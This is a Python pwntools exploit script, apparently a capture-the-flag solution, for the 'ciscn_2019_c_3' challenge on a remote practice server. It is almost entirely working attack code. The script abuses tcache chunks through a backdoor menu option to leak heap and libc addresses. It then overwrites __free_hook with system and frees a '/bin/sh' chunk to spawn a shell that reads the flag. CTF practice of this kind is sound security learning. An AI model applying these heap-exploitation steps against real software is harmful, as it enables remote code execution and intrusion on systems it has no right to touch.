# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './ciscn_2019_c_3'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '29259'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) )

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('Command:',num)

def add(size , name = 'a\n'):
    cmd(1)
    sla('size:' , size)
    sa('the name:' , name)

def backdoor(idx):
    cmd(666)
    sla('weapon:' , idx)

def show(idx):
    cmd(2)
    sla('index:' , idx)

def delete(idx):
    cmd(3)
    sla('weapon:' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    add(0x100 )
    add(0x60 )
    add(0x100 )
    delete(0)
    delete(2)

    show(2)
    ru('attack_times: ')
    heap_base = rint(14) & 0xfffffffff000
    lg('heap_base',heap_base)
    for i in range(0xf0):
        backdoor(2)
    delete(1)
    add(0x100)
    # dbg()
    add(0x100 , flat(0 , 0x71 , heap_base + 0x10 , 0 ,'\x00'*0x58  , 0x111 , '/bin/sh\x00' ) + '\n')
    add(0x60)
    add(0x60 , '\x07'*0x60)

    delete(6)
    show(6)
    ru('attack_times: ')
    leak = rint(15)

    __malloc_hook = leak - 0x70
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']

    lg('__free_hook',__free_hook)
    add(0x100 , p64(__free_hook - 0x18) * 0x18 + "\n" )
    add(0x100 , flat('/bin/sh\x00' , system_addr) + '\n')

    # dbg('free')
    delete(2)

    # dbg()

    ''

attack()
p.success(getShell())
p.interactive()

'''
@File    :   ciscn_2019_c_3.py
@Time    :   2021/10/27 23:10:47
@Author  :   Niyah 
'''